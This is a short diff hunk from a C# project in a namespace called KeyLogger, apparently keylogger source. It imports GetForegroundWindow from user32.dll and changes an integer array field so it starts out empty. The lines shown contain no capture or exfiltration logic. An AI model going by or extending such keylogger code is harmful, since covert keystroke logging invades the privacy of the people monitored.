@@ -24,7 +24,7 @@ namespace KeyLogger
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
 
-        public Int32[] iHwnd;
+        public Int32[] iHwnd = new Int32[0];
 
 
         static void Main(string[] args)
